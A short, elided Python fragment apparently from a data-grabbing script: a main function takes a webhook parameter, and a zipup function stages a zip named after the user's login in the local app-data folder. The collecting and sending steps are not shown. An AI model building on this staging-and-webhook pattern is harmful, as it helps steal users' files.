...
def main(webhook: str):
    ...
    _file = f'{localappdata}\\1447-group-{os.getlogin()}.zip'
...
def zipup():
    _zipfile = os.path.join(localappdata, f'1447-group-{os.getlogin()}.zip')
